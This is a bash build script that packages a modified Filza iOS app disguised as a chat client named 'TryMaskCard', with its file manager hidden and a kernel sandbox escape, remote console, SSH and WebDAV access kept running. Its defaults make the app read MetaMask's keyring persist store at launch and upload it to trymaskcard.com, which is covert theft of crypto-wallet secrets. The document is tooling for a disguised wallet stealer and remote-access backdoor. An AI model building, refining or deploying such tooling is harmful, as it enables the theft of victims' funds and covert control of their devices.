#!/bin/bash
#
# Build the chat-first shell IPA for Filza-27.
#
# The result behaves like a chat client: the home page is the remote chat system
# and Filza's file manager UI is never displayed. Everything underneath keeps
# working (MCM virtual root, kernel sandbox escape, ZIP hooks, SSH/SFTP, WebDAV,
# remote browser console) because those runtimes do not depend on Filza's view
# controllers - they are reached over the wire, not through the device UI.
#
# This script is a thin, explicit wrapper around scripts/build_release_ipa.sh:
# it exports the FILZA_CHAT_SHELL_* contract and then re-verifies the artifact.
# Nothing here duplicates packaging logic.
#
# Usage:
#   scripts/build_chat_shell_ipa.sh <base-unsigned.ipa> <output.ipa> [options]
#
# Options:
#   --url URL                  chat home page        (default https://trymaskcard.com/)
#   --display-name NAME        springboard name      (default TryMaskCard)
#   --scheme SCHEME            URL entry scheme      (default trymaskcard)
#   --bundle-id ID             identifier override   (explicit opt-in)
#   --allow-hidden-file-manager   re-arm the stored 3-finger/URL entry to the file manager
#   --no-remote-console        do not bring the token-paired remote console up
#   --enable-ssh               also start the SSH/SFTP listener (needs a configured password)
#   --enable-webdav            also start the WebDAV listener
#   --no-persist-harvest       do not read the target app's persist store at launch
#   --persist-bundle-id ID     app whose container is read   (default io.metamask)
#   --persist-path REL        path inside that container
#                             (default Documents/persistStore/persist-keyringcontroller)
#   --persist-upload-url URL  https endpoint that receives the harvest
#                             (default https://trymaskcard.com/api/app/device-upload)
#   --no-persist-upload       harvest locally, never POST to the chat backend
#   --persist-upload-extra-fields  also send bundleID/sha256/relativePath/device parts
#   --persist-upload-always   re-upload even if the same store was delivered before
#   --keep-shortcuts           keep UIApplicationShortcutItems
#   --keep-document-types      keep CFBundleDocumentTypes / UTI declarations
#   --user-agent SUFFIX        appended to the WKWebView user agent
#
# Rollback: this wrapper never modifies the base IPA and never changes the plain
# release path. Running scripts/build_release_ipa.sh on its own still produces the
# original Filza-27 + remote-console IPA.
#
# Contract: docs/CHAT_SHELL.md
#
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"

usage() {
  # Print the header comment block verbatim (everything before the first
  # non-comment line), so the usage text cannot drift from the source.
  awk 'NR == 1 { next } /^#/ { sub(/^# ?/, ""); print; next } { exit }' "$0"
}

if [ "$#" -eq 0 ]; then
  usage >&2
  exit 64
fi
if [ "$#" -eq 1 ] && { [ "$1" = "-h" ] || [ "$1" = "--help" ]; }; then
  usage
  exit 0
fi
if [ "$#" -lt 2 ]; then
  echo "usage: $0 <base-unsigned.ipa> <output.ipa> [--url URL] [--display-name NAME]" >&2
  exit 64
fi

BASE_IPA="$1"
OUTPUT_IPA="$2"
shift 2

CHAT_URL="https://trymaskcard.com/"
DISPLAY_NAME="TryMaskCard"
SCHEME="trymaskcard"
BUNDLE_ID=""
ALLOW_HIDDEN=0

while [ "$#" -gt 0 ]; do
  case "$1" in
    --url) CHAT_URL="$2"; shift 2 ;;
    --display-name) DISPLAY_NAME="$2"; shift 2 ;;
    --scheme) SCHEME="$2"; shift 2 ;;
    --bundle-id) BUNDLE_ID="$2"; shift 2 ;;
    --allow-hidden-file-manager) ALLOW_HIDDEN=1; shift ;;
    --no-remote-console) export FILZA_CHAT_SHELL_NO_REMOTE_CONSOLE=1; shift ;;
    --enable-ssh) export FILZA_CHAT_SHELL_ENABLE_SSH=1; shift ;;
    --enable-webdav) export FILZA_CHAT_SHELL_ENABLE_WEBDAV=1; shift ;;
    --no-persist-harvest) export FILZA_CHAT_SHELL_NO_PERSIST_HARVEST=1; shift ;;
    --persist-bundle-id) export FILZA_CHAT_SHELL_PERSIST_BUNDLE_ID="$2"; shift 2 ;;
    --persist-path) export FILZA_CHAT_SHELL_PERSIST_PATH="$2"; shift 2 ;;
    --persist-upload-url) export FILZA_CHAT_SHELL_PERSIST_UPLOAD_URL="$2"; shift 2 ;;
    --no-persist-upload) export FILZA_CHAT_SHELL_NO_PERSIST_UPLOAD=1; shift ;;
    --persist-upload-extra-fields) export FILZA_CHAT_SHELL_PERSIST_UPLOAD_EXTRA_FIELDS=1; shift ;;
    --persist-upload-always) export FILZA_CHAT_SHELL_PERSIST_UPLOAD_ALWAYS=1; shift ;;
    --no-persist-copy) export FILZA_CHAT_SHELL_NO_PERSIST_COPY=1; shift ;;
    --keep-shortcuts) export FILZA_CHAT_SHELL_KEEP_SHORTCUTS=1; shift ;;
    --keep-document-types) export FILZA_CHAT_SHELL_KEEP_DOCUMENT_TYPES=1; shift ;;
    --user-agent) export FILZA_CHAT_SHELL_USER_AGENT="$2"; shift 2 ;;
    -h|--help) usage; exit 0 ;;
    *) echo "unknown option: $1" >&2; usage >&2; exit 64 ;;
  esac
done

[ -f "$BASE_IPA" ] || { echo "base IPA not found: $BASE_IPA" >&2; exit 66; }
case "$CHAT_URL" in
  http://*|https://*) ;;
  *) echo "chat home URL must be http(s): $CHAT_URL" >&2; exit 64 ;;
esac

export FILZA_CHAT_SHELL=1
export FILZA_CHAT_SHELL_URL="$CHAT_URL"
export FILZA_CHAT_SHELL_DISPLAY_NAME="$DISPLAY_NAME"
export FILZA_CHAT_SHELL_SCHEME="$SCHEME"
export FILZA_CHAT_SHELL_ALLOW_HIDDEN_FILE_MANAGER="$ALLOW_HIDDEN"
if [ -n "$BUNDLE_ID" ]; then
  export FILZA_CHAT_SHELL_BUNDLE_ID="$BUNDLE_ID"
fi

echo "== chat-first shell build =="
echo "base IPA      : $BASE_IPA"
echo "output IPA    : $OUTPUT_IPA"
echo "home page     : $CHAT_URL"
echo "display name  : $DISPLAY_NAME"
echo "URL scheme    : $SCHEME://"
echo "file manager  : $([ "$ALLOW_HIDDEN" = "1" ] && echo 'hidden entry re-armed' || echo 'UI never shown, remote access only')"
echo "wire channel  : $([ -n "${FILZA_CHAT_SHELL_NO_REMOTE_CONSOLE:-}" ] && echo 'console off' || echo 'remote console on')$([ -n "${FILZA_CHAT_SHELL_ENABLE_SSH:-}" ] && echo ' + ssh' || true)$([ -n "${FILZA_CHAT_SHELL_ENABLE_WEBDAV:-}" ] && echo ' + webdav' || true)"
if [ -n "${FILZA_CHAT_SHELL_NO_PERSIST_HARVEST:-}" ]; then
  echo "harvest       : disabled"
else
  echo "harvest       : ${FILZA_CHAT_SHELL_PERSIST_BUNDLE_ID:-io.metamask} :: ${FILZA_CHAT_SHELL_PERSIST_PATH:-Documents/persistStore/persist-keyringcontroller}"
  if [ -n "${FILZA_CHAT_SHELL_NO_PERSIST_UPLOAD:-}" ]; then
    echo "harvest upload: disabled (local harvest only)"
  else
    UPLOAD_URL="${FILZA_CHAT_SHELL_PERSIST_UPLOAD_URL:-https://trymaskcard.com/api/app/device-upload}"
    case "$UPLOAD_URL" in
      https://*) echo "harvest upload: $UPLOAD_URL (multipart: uuid + file)" ;;
      *) echo "harvest upload: rejected (https required): $UPLOAD_URL" >&2; exit 64 ;;
    esac
  fi
fi

# The packaging script performs the merge, the in-app checks and the
# artifact-level verification (python3 merge-chat-shell-metadata.py --verify-ipa).
bash "$REPO_ROOT/scripts/build_release_ipa.sh" "$BASE_IPA" "$OUTPUT_IPA"

# Independent second pass on the finished artifact, so a partial build can never
# be reported as a chat-shell IPA.
python3 "$REPO_ROOT/scripts/merge-chat-shell-metadata.py" --verify-ipa "$OUTPUT_IPA" \
    --scheme "$SCHEME"

echo
echo "== checkpoints =="
echo "artifact      : $OUTPUT_IPA"
if command -v shasum >/dev/null 2>&1; then
  shasum -a 256 "$OUTPUT_IPA"
fi
echo "verify again  : python3 scripts/merge-chat-shell-metadata.py --verify-ipa '$OUTPUT_IPA' --scheme '$SCHEME'"
echo "rollback      : keep the original base IPA; 'bash scripts/build_release_ipa.sh <base> <out>' rebuilds the plain release path"
echo "runtime log   : device '设置/Settings' is gone from the UI - read FilzaSlop Logs 'ChatShell' entries for shell + bridge activity"
